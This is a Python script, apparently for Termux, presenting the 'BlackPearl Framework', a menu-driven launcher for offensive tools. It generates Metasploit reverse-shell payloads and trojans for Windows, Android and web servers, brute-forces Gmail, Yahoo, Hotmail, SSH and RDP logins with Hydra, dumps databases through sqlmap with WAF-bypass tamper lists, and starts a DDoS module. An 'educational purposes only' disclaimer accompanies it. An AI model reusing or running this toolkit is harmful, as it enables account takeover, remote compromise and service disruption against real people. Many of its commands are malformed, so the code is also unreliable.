#!/bin/env python
import os,sys
import time
import random
from urllib.request import urlopen
w= '\x1b[00m'
r= '\x1b[91m'
F = '\033[91m'
G = '\033[92m'
os.system("run")
os.system("clear")
def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1.5 / 10)
def sprint(s):
        for c in s +'\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(0.1  / 100)
ban1 = """\x1b[36m                                                                   
   @@@@@@@@@@@@@@@                                          @@@@@@@@@@@@@@@@@@@ 
    %@@@@@@@@@  /@@@@@@    (@@@@@@@@@@@@@@@@@@@@@@@,    @@@@@@@.     @@@@@@@@%  
        ,@@@@@@@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@        
        @@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@#       @@@@@@@@@,        
          @@@@@@@@@@@@       #@@@@@@@@@@@@@@@@@@@@@@      /@@@@@@@@@@           
           @@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@/    @@        @@@@@@@         
         @@@        @@@@@,  &     @@@@@@@@@@@@@@      @@@@           %@@@       
       @@            ,@     @@&    @@@@@@@@@@@   @     @@(         @@@@@.@@     
     @@             @@@,  @@.   @   ,@/    @      @(,  @@@@         @@@@@@@@@   
    @   /@@         @ @   @ @  @       @&     %( @,,  .*@@@           @@@@@  @  
   @@@@@@.           @ @@    @@@ @  @@@@@@  @ @@@    @ @@%             @@@@@.   
  @@@@@@           &@@@(  @@@#     @.@@@@%@      @@@  @&@@@        &@@@ @@@@@   
   @@@@                   @       @@@  @@@@       @@@@@@            @@@@@@@@@&  
   @@@ @.                  .@   &  @@  @@@# .   @@@@@@@*         @@ .@@@@@@@@@  
  @@@@@@/                  @@@.@@@  @, @@@ @@@@@@@@@             @@@@@@@@@@  @  
  @@@@@@@ #          @@.      @.     @ @@       ,     @@      @% @@@@@@@@@@     
   # @@@@@@@  @         @@@@          &@%         @@@        @@@@@@@@@@@@@@     
      @@@@@@@ @@@@#     , @@@@@               @@@@       %@,,@@@@@@@@@@@@@      
       @@@@@@@&@@@@@@@    @@@@@@@@         @@@@@ @@    @@@@@@@@@@@@@@ @@@.      
        (@@ @@@@@@@@@@@@@.  @@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@ @@@@@  @@        
              @@@@@@@@@@@@@@. @@@@@@@@@@@@@@@@%  .@@@@@@@@@    @@@    (         
                @@@, @@@@@@@@@@,@@@@@@@@@@@@  @@@@@(.@@@       @                
                   @(   @@@@ @@@@@@@@@@@@@%@@@@@@  @@                           
                           @@   @@@@@@@@@@@@@@,                                 
                                  @@@@@@@@@@                                                                                                             
 ________ ______                   *@@@@                  
/_  __/ // / __/                                      
 / / / _  / _/                                        
/_/_/_//_/___/__  _______ _____  _______   ___  __    
  / _ )/ /  / _ |/ ___/ //_/ _ \/ __/ _ | / _ \/ /    
 / _  / /__/ __ / /__/ ,< / ___/ _// __ |/ , _/ /__   
/____/____/_/_|_\___/_/|_/_/__/___/_/_|_/_/|_/____/ __
  / __/ _ \/ _ | /  |/  / __/ | /| / / __ \/ _ \/ //_/
 / _// , _/ __ |/ /|_/ / _/ | |/ |/ / /_/ / , _/ ,<   
/_/ /_/|_/_/ |_/_/  /_/___/ |__/|__/\____/_/|_/_/|_|"""

banner = """
  \x1b[36m+~~~~~[\x1b[00m THE BLACKPEARL FRAMEWORK\x1b[36m]~~~~~~\x1b[36m+
  \x1b[36m+~~~~~[\x1b[00m MSF NMAP DDOS WORDLISTER HYDRA SQLMAP INFO\x1b[36m]~~~~~~\x1b[36m+
  \x1b[36m+~~~~~[\x1b[00m Use help command for using BP-F\x1b[36m]~~~~~~\x1b[36m+""" 

ban2 = """\x1b[91m
██████╗ ██████╗       ███████╗
██╔══██╗██╔══██╗      ██╔════╝
██████╔╝██████╔╝█████╗█████╗  
██╔══██╗██╔═══╝ ╚════╝██╔══╝  
██████╔╝██║           ██║     
╚═════╝ ╚═╝           ╚═╝"""                             

ban3 = """\x1b[36m
╔╦╗╦ ╦╔═╗
 ║ ╠═╣║╣ 
 ╩ ╩ ╩╚═╝
╔╗ ╦  ╔═╗╔═╗╦╔═╔═╗╔═╗╔═╗╦═╗╦  
╠╩╗║  ╠═╣║  ╠╩╗╠═╝║╣ ╠═╣╠╦╝║  
╚═╝╩═╝╩ ╩╚═╝╩ ╩╩  ╚═╝╩ ╩╩╚═╩═╝
╔═╗╦═╗╔═╗╔╦╗╔═╗╦ ╦╔═╗╦═╗╦╔═
╠╣ ╠╦╝╠═╣║║║║╣ ║║║║ ║╠╦╝╠╩╗
╚  ╩╚═╩ ╩╩ ╩╚═╝╚╩╝╚═╝╩╚═╩ ╩"""

ban4 = """\x1b[32m

╔══╗╔╗──╔═══╦═══╦╗╔═╦═══╦═══╦═══╦═══╦╗
║╔╗║║║──║╔═╗║╔═╗║║║╔╣╔═╗║╔══╣╔═╗║╔═╗║║
║╚╝╚╣║──║║─║║║─╚╣╚╝╝║╚═╝║╚══╣║─║║╚═╝║║
║╔═╗║║─╔╣╚═╝║║─╔╣╔╗║║╔══╣╔══╣╚═╝║╔╗╔╣║─╔╗
║╚═╝║╚═╝║╔═╗║╚═╝║║║╚╣║──║╚══╣╔═╗║║║╚╣╚═╝║
╚═══╩═══╩╝─╚╩═══╩╝╚═╩╝──╚═══╩╝─╚╩╝╚═╩═══╝"""

ban5 = """\x1b[91m
                                 P___----....
                                ! __
                      ' ~~ ---.#..__ `  ~  ~    -  -  .   .:
                       `             ~~--.               .F~~___-__.
                       ;                   ,       .- . _!
                      ,                     '       ;      ~ .
                     ,        ____           ;      ' _ ._    ;
                    ,_ . - '___#,  ~~~ ---. _,   . '  .#'  ~ .;
                  =---==~~~    ~~~==--__     ; '~ -. ,#_     .'
                   '                     `~=.;           `  /
                                             '  '          '.
                    '                         '
            \                                  ' '            '
            `.`\    '                          . ;             ,
              \  `  '                            '             ;
               ;   '                           '               '
             /_ .,                           /   __...---./   '
             ',_,   __.--- ~~;#~ --..__    _'.-~;#     //  `.'
             / / ~~ .' .     #;         ~~  /// #;   //   /
           /    ' . __ .  ' ;#;_ .        ////.;#;./ ;  /
           \ .        /    ,##' /   _   /. '(/    ~||~\'
            \  ` - . /_ . -==-  ~ '   / (/ '     . ;;. ',
           /' .       ' -^^^...--- ``(/'    _  '   '' `,;
##,. .#...(       '   .c  c .c  c  c.    '..      ;; ../
%%#%;,..##.\_                           ,;###;,. ;;.:##;,.    
%%%%########%%%%;,.....,;%%%%%%;,.....,;%%%%%%%%%%%%%%%%%%%%............ 
╔╗ ╦  ╔═╗╔═╗╦╔═
╠╩╗║  ╠═╣║  ╠╩╗
╚═╝╩═╝╩ ╩╚═╝╩ ╩
╔═╗╔═╗╔═╗╦═╗╦  
╠═╝║╣ ╠═╣╠╦╝║  
╩  ╚═╝╩ ╩╩╚═╩═╝
╔═╗╦═╗╔═╗╔╦╗╔═╗╦ ╦╔═╗╦═╗╦╔═
╠╣ ╠╦╝╠═╣║║║║╣ ║║║║ ║╠╦╝╠╩╗
╚  ╩╚═╩ ╩╩ ╩╚═╝╚╩╝╚═╝╩╚═╩ ╩
(*)MSF (*)NMAP (*)HYDRA (*)DDOS (*)WORDLISTER (*)SQLMAP (*)INFO"""

ban6 = """\x1b[32m

                     .
'########::'########:::::::::::'########:
 ##.... ##: ##.... ##:::::::::: ##.....::
 ##:::: ##: ##:::: ##:::::::::: ##:::::::
 ########:: ########::'#######: ######:::
 ##.... ##: ##.....:::........: ##...::::
 ##:::: ##: ##::::::::::::::::: ##:::::::
 ########:: ##::::::::::::::::: ##:::::::
........:::..::::::::::::::::::..::::::::"""
                               
                                                                                
ban7 = """\x1b[00m
	      ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE DOS!    |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'""" 

ban8 = """\x1b[91m
==========
=      ===
=  ===  ==
=  ====  =
=  ===  ==
=      ===
=  ===  ==
=  ====  =
=  ===  ==
=      ===
========== 
==========  
MM"""""""`YM 
MM  mmmmm  M 
M'        .M 
MM  MMMMMMMM FFFF RRR  W   w   W RRR  K k
MM  MMMMMMMM F    R R   W  w  W  R R  Kk
MM  MMMMMMMM FFF  RR     W w W   RR   Kk
MMMMMMMMMMMM F    R  R    WwW    R  R K k"""

def randomlogo():
        listlogo = [ban1,ban2,ban3,ban4,ban5,ban6,ban7,ban8]
        logo=(random.choice(listlogo))
        sprint(logo)

def msf():
	print()
	print("1.Install Metasploit Framework")
	print("2.Metasploit Framework version")
	print("3.Windows > payload.exe (payload and listener) ")
	print("4.Android > payload.apk(Payload and listener)") 
	print("5.Linux >  payload.py(payload and listener)")
	print("6.MacOS > payload.jar(payload and listener)")
	print("7.Simple TCP shell for PHP")
	print("8.Simple TCP shell for WAR")
	print("9.Simple TCP shell for ASP")
	print("10.Simple TCP shell for javascript")
	print("11.Trojan or backdoor for windows xp/7")
	print()
	j = input(w + 'pearl(' + r + 'msf' + w + ') > ')
	if j == '1':
		os.system("pkg install unstable-repo")
		os.system("pkg install metasploit")
		print()
		print("Metasploit Framework Installed Successfully")
		msf()
	elif j == '2':
		print()
		print("Current MSF Version : 5.0.0 / Jan 10, 2019")
		msf()
	elif j == '3':
		i = input("LHOST : ")
		print()
		print("Making Windows Payload....")
		os.system("msfvenom - p windows/meterpreter/reverse_tcp lhost=" + i +  'lport=4444 - f exe > /sdcard/payload.exe')
		print()
		print("Payload Is Saved In Storage")
		print()
		print("Opening Metasploit Meterpreter")
		print()
		print("\n Use this after opening listener \n Steps  : \n 1.set payload windows/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
		print()
		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
	elif j == '4':
		i = input("LHOST : ")
		os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + i + 'lport=4444 R > /sdcard/payload.apk')
		print()
		print("Payload Is Saved In Storage")
		print()
		print("Opening Metasploit Meterpreter")
		print()
		print("\n Use this after opening listener \n Steps  : \n 1.set payload android/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
		print()
		os.system("msfconsole -q -x 'use exploit/multi/handler;'")
	elif j == '5':
		i = input("LHOST : ")
		os.system("msfvenom - p python/meterpreter/reverse_tcp lhost=" + i +  'lport=4444 > /sdcard/payload.py')
		print()
		print("Payload Is Saved In Storage")
		print()
		print("Opening Metasploit Meterpreter")
		print()
		print("\n Use this after opening listener \n Steps  : \n 1.set payload python/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
	elif j == '6':
		i = input("LHOST : ")
		os.system("msfvenom - p windows/meterpreter/reverse_tcp lhost=" + i +  'lport=4444 - f jar > /sdcard/file.jar')
		print()
		print("Payload Is Saved In Storage")
		print()
		print("Opening Metasploit Meterpreter")
		print()
		print("\n Use this after opening listener \n Steps  : \n 1.set payload java/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
	elif j == '7':
		i = input("LHOST : ")
		print()
		print("Making Payload....")
		print()
		os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + i + 'LPORT=4444 -f raw > file.php')
		print()
		print("Payload Is Saved In Storage")
		msf()
	elif j == '8':
		i = input("LHOST : ")
		print()
		print("Making Payload..")
		print()
		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + i + 'LPORT=4444 -f war > file.war')
		print()
		print("Payload Is Saved In Storage")
		msf()
	elif j == '9':
		i = input("LHOST : ")
		print()
		print("Making Payload...")
		print()
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + i + 'LPORT=4444 -f asp > file.asp')
		print()
		print("Payload Is Saved In Storage")
		msf()
	elif j == '10':
		i = input("LHOST : ")
		print()
		print("Making Payload...")
		print()
		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + i + 'LPORT=4444 -f raw > file.jsp')
		print()
		print("Payload Saved In Storage")
		msf()
	elif j == '11':
		i = input("LHOST : ")
		print()
		print("Making Payload....")
		print()
		os.system("msfvenom windows/meterpreter/reverse_tcp LHOST=" + i + 'LPORT=6666 x > /sdcard/trojan.exe')
		print()
		print("Payload Is Saved In Storage")
		print()
		print("Opening Metasploit Meterpreter")
		print()
		print("\n Use this after opening listener \n Steps  : \n 1.set payload windows/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 6666 \n 4.exploit")
		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
	elif j == 'help':
		print("\n This is an automater for making different malicious payloads for exploiting different system using metasploit framework project. \n Use different numbers corresponding to different options for using them. \n back - To go back to pearl console \n")
	elif j == 'back':
		main()
	else:
		print(r + '[!]' + w + 'Invalid Input')
		print(r + '[!]' + w + 'Try Again')
		msf()

def nmap():
	print()
	print("1.Scan a website to find open ports")
	print("2.Scan for open port only")
	print("3.Scan a subnet")
	print("4.Scan a range of ports")
	print("5.Scan 100 most common ports")
	print("6.Scan all 65535 ports")
	print("7.Scan using TCP connect")
	print("8.Scan using TCP SYN")
	print("9.Scan UFO ports")
	print("10.Detect OS & Service")
	print("11.Standard service detecting")
	print("12.Detect more aggressive services")
	print("13.Light Banner Grabbing Detection")
	print("14.Scan using default safe scripts")
	print("15.Scan using a specific NSE script")
	print("16.Scan with a set of scripts")
	print("17.Scan for DDOS reflectors")
	print("18.Gather page titles from HTTP services")
	print("19.HEARTBLEED testing")
	print("20.Perform a RPC scan")
	print("21.Scan IP with a given range")
	print("22.Check firewall")
	print("23.Scan a specified port")
	print("24.Scan specified ports")
	print("25.Check vulnerabiliity")
	print()
	global r
	i = input(w + "[pearl(" + r + 'nmap' + w + ") > ")
	if i == '1':
		j = input("Enter Site/IP : ")
		os.system("nmap" + j)
		nmap()
	elif i == '2':
		j = input("Enter Site/IP : ")
		os.system("nmap -open " + j)
		nmap()
	elif i == '3':
		j = input("Enter Site/IP : ")
		os.system("nmap" + j + '/24')
		nmap()
	elif i == '5':
		j = input("Enter Site/IP : ")
		os.system("nmap -F " + j)
		nmap()
	elif i == '4':
		j = input("Enter Site/IP : ")
		os.system("nmap -p 1-100" + j)
		nmap()
	elif i == '6':
		j = input("Enter Site/IP : ")
		os.system("nmap -p- " + j)
		nmap()
	elif i == '7':
		j = input("Enter Site/IP : ")
		os.system("nmap -sT " + j)
		nmap()
	elif i == '8':
		j = input("Enter Site/IP : ")
		os.system("nmap -sS " + j)
		nmap()
	elif i == '9':
		j = input("Enter Site/IP : ")
		os.system("nmap -sU -p 123,161,162 " + j)
		nmap()
	elif i == '10':
		j = input("Enter Site/IP : ")
		os.system("nmap -A " + j)
		nmap()
	elif i == '11':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV " + j)
		nmap()
	elif i == '12':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV " + j)
		nmap()
	elif i == '13':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV --version-intensity 0 " + j)
		nmap()
	elif i == '14':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV -sC " + j)
		nmap()
	elif i == '15':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV -p 443 –script=ssl-heartbleed.nse " + j)
		nmap()
	elif i == '16':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV --script=smb*  " + j)
		nmap()
	elif i == '17':
		j = input("Enter Site/IP : ")
		os.system("nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr " + j + '/24')
		nmap()
	elif i == '18':
		j = input("Enter Site/IP : ")
		os.system("nmap --script=http-title " + j)
		nmap()
	elif i == '19':
		j = input("Enter Site/IP : ")
		os.system("nmap -sV -p 443 --script=ssl-heartbleed " + j +'/24')
		nmap()
	elif i == '20':
		j = input("Enter Site/IP : ")
		os.system("nmap -sR " + j)
		nmap()
	elif i == '21':
		r = input("Enter range : ")
		j = input("Enter Site/IP : ")
		os.system("nmap " + j + '-' + r)
		nmap()
	elif i == '22':
		j = input("Enter Site/IP : ")
		os.system("nmap -PN " + j)
		nmap()
	elif i == '23':
		p = input("Enter Port : ")
		j = input("Enter Site/IP : ")
		os.system("nmap -p " + j + p)
		nmap()
	elif i == '24':
		p = input("Enter Port1 : ")
		q = input("Enter Port2 : ")
		j = input("Enter Site/IP : ")
		os.system("nmap -p " + j + ',' + q + j)
		nmap()
	elif i == '25':
		j = input("Enter Site/IP : ")
		os.system("nmap --script dos -Pn " + j)
		nmap()
	elif i == 'back':
		main()
	elif i == 'help':
		print(" \n This is an automater for port scanning ,vulnerability scanning,finding sys info ,etc. \n back - To go back to pearl console ")
		nmap()
	else:
		print(r + '[!]' + w + 'Invalid Input')
		print(r + '[!]' + w + 'Try Again')
		nmap()
		
			  

def hydra():
     print("1.Dowload Hydra")
     print("2.Cisco bruteforce")
     print("3.FTP bruteforce")
     print("4.Gmail bruteforce")
     print("5.SSH bruteforce")
     print("6.Telnet bruteforce")
     print("7.Yahoo mail bruteforce")
     print("8.Hotmail bruteforce")
     print("9.Router speedy bruteforce")
     print("10.RDP bruteforce")
     print("11.MySql bruteforce")
     print("12.Teamspeak bruteforce")
     print("13.VNC bruteforce")
     print()
     global r
     global w
     i = input(w + 'pearl(' + r + 'hydra' + w + ') > ')
     if i == '1':
     	os.system("clear")
     	print("Installing Hydra")
     	os.system("pkg install hydra")
     elif i == '2':
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -P %s %s cisco" % (j, w))
     	hydra()
     elif i == '3':
     	os.system("clear")
     	u = input("User : ")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s %s ftp" % (u, j, w))
     	hydra()
     elif i == '13':
     	os.system("clear")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -P %s -e n -t 1 %s vnc -V" % (j, w))
     	hydra()
     elif i == '4':
     	os.system("clear")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (e, j))
     	hydra()
     elif i == '5':
     	os.system("clear")
     	u = input("User : ")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s %s ssh" % (u,j, w))
     	hydra()
     elif i == '6':
     	os.system("clear")
     	u = input("User : ")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s %s telnet" % (u, j, w))
     	hydra()
     elif i == '7':
     	os.system("clear")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (e, j))
     	hydra()
     elif i == '8':
     	os.system("clear")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (e, j))
     	hydra()
     elif i == '9':
     	os.system("clear")
     	u = input("User : ")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -m / -l %s -P %s %s http-get" % (u, j, e))
     	hydra()
     elif i == '10':
     	os.system("clear")
     	u = input("User :")
     	e = input("Email :")
     	j = input("Wordlist :")
     	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
     	hydra()
     elif i == '11':
     	os.system("clear")
     	u = input("User :")
     	i = input("Enter IP : ")
     	j = input("'Wordlist :")
     	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
     	hydra()
     elif i == '12':
        u = input("User :")
        i = input("IP :")
        j = input("Wordlist :")
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (u, j, i))
        hydra()
     elif i == 'help':
        os.system("clear")
        print("\n Use numbers corresponding to options to use them. \n back - To go back to pearl console")
        hydra()
     elif i == 'clear':
     	os.system("clear")
     	hydra()
     elif i == 'back':
     	main()
     else:
     	print(r + '[!]' + w + 'Invalid Input')
     	print(r + '[!]' + w + 'Try Again')
     	print()
     	hydra() 
     	

def sql():
	 os.system("cd ~/sqlmap")
	 print()
	 print("1.Download Sqlmap")
	 print("2.Scan a website to find sql vuln")
	 print("3.Get database")
	 print("4.Get tables of one db")
	 print("5.Get columns of a table")
	 print("6.Get data from  table")
	 print("7.WAF bypass")
	 print()
	 global r
	 global w
	 j = input(w + 'pearl(' + r +'sqlmap' + w + ') > ')
	 if j == '1':
	 	os.system("cd /data/data/com.termux/files/home && git clone https://github.com/sqlmapproject/sqlmap.git")
	 	print("Sqlmap Successfully Installed")
	 	sql()
	 elif j == '2':
	 	w = input("Enter Website : ")
	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + w + '%27')
	 	sql()
	 elif j == '3':
	 	w = input("Enter Website : ")
	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + w + '--dbs')
	 	sql()
	 elif j == '4':
	 	w = input("Enter Website : ")
	 	d = input("Enter Database : ")
	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + w + "--tables -D" + d)
	 	sql()
	 elif j == '5':
	 	w = input("Enter website : ")
	 	d = input("Enter Database : ")
	 	k = input("Enter Table : ")
	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + w + "--columns -D" + d + '-T' + k)
	 	sql()
	 elif j == '6':
	 	w = input("Enter Website : ")
	 	d = input("Enter Datebase : ")
	 	k = input("Enter Table : ")
	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + w + "--dump -D" + d + "-T" + k)
	 elif j == '7':
	 	print("1.General Tamper Testing")
	 	print("2.MSSQL")
	 	print("3.MySql")
	 	m = input("Enter WAF Option : ")
	 	if m == '3':
	 			w = input("Enter Website : ")
	 			os.system("cd ~/sqlmap;python sqlmap -u" + w + "--level=5 --risk=3 -p 'item1 - - tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor")
	 			sql()
	 	elif m == '1':
	 				os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes")
	 				sql()
	 	elif m == '2':
	 			os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes")
	 			sql()
	 elif j == 'back':
	 			main()
	 elif j == 'help':
	 			print("\n This is an automater for performing sql injection to a websiteb usig sqlmap. \n back - To go back to pearl console \n ")
	 else:
	 	print(r + '[!]' + w + 'Invalid Input')
	 	print(r + '[!]' + w + 'Try Again')
	 	sql()

	 	 
	
def info():
	print()
	print("1.Geo Ip lookup")
	print("2.Host finder")
	print("3.HTTP finder")
	print("4.Host DNS finder")
	print("5.Reverse IP looker")
	print("6.Traceroute")
	global r
	global w
	i = input(w + 'pearl(' + r + 'info' + w + ') > ')
	if i == '1':
		d = input('Enter IP Address : ')
		g = "http://api.hackertarget.com/geoip/?q=" + d
		ip = urlopen(g).read()
		print(ip)
		info()
	elif i == '2':
		d = input('Enter Domain : ')
		h = "http://api.hackertarget.com/hostsearch/?q=" + d
		f = urlopen(h).read()
		print(f)
		info()
	elif i == '3':
		d = input("Enter Domain : ")
		h = "http://api.hackertarget.com/httpheaders/?q=" + d
		der =  urlopen(h).read()
		print(der)
		info()
	elif i == '4':
		d = input("Enter Domain : ")
		get = "https://api.hackertarget.com/mtr/?q=" + d
		page = urlopen(get).read()
		print(page)
		info()
	elif i == '5':
	     d = input("Enter IP : ")
	     reverse = "http://api.hackertarget.com/reverseiplookup/?q=" + d
	     lookup = url.open(reverse).read()
	     print(lookup)
	     info()
	elif i == '6':
	     d = input("Enter Domain : ")
	     host = "http://api.hackertarget.com/findshareddns/?q=" + d
	     dns = urlopen(host).read()
	     print(dns)
	     info()
	elif i == 'back':
	    main()
	elif i == 'exit':
	    sys.exit(1)
	elif i == 'help':
	    print("\n Select corresponding number to given option here. use command back to go back to pearl console. \n This is for information gathering. \n exit - To exit from console \n")
	else:
		print(r + '[!]' + w + 'Invalid Input')
		print(r + '[!]' + w + 'Try Again')
		info()			
def mainmenu():
	randomlogo()
	sprint(banner)
	main()
	
def main():
  	 i = input(w + "[pearl~> ")
  	 if i == 'msf':
  	 	print("Opening Metasploit Automater")
  	 	msf()
  	 elif i == 'nmap':
  	 	print("Opening Network Mapper Automater")
  	 	time.sleep(2)
  	 	nmap()
  	 elif i == 'hydra':
  	 	print("Opening Hydra Automater")
  	 	hydra()
  	 elif i == 'wl':
  	 	print("Opening Wordlist Automater")
  	 	time.sleep(2)
  	 	os.system("cd /data/data/com.termux/files/home/Blackpearl-framework/module;bash wl.sh")
  	 elif i == 'ddos':
  	 	print("Opening DDOS Automater")
  	 	time.sleep(2)
  	 	os.system("cd /data/data/com.termux/files/home/Blackpearl-framework/module;python2 Ddos.py")
  	 elif i == 'help':
  	 	print("This is an automater for various main exploiting frameworks and scanning frameworks. \n Use : \n msf - To open metasploit framework automater \n hydra - To open hydra bruteforce automater \n sql - To open sqlmap website penetration automater \n ddos - To open powerful DDOS automater \n info - To open information gathering automater \n nmap - To open network mapper automater \n wl - To open custom wordlist maker \n exit - To exit from pearl console \n update - To update this this framework \n about - To know more about us \n")
  	 	main()
  	 elif i == 'exit':
 	  	sys.exit(1)
  	 elif i == 'about':
  	 	delay_print("This is just a project from the Fraternity.This is made for penetration testing in termux. This is only for educational purposes only. We are not responsible for any illegal activities.For any issues or errors contact us on our email Cipherweb777@gmail.com. Use 'help' command to get any help in using this project") 
  	 	main() 
  	 elif i == 'clear':
  	 	main()
  	 elif i == 'update':
  	 	os.system("cd /data/data/com.termux/files/home/Blackpearl-framework/module;python update.py")
  	 elif i == 'sql':
  	 	print("Opening Sqlmap Automater")
  	 	sql()
  	 elif i == 'info':
  	 	info()
  	 else:
  	 	print(r + '[!]' + w + 'Invalid Input')
  	 	main()
  	 	
mainmenu()
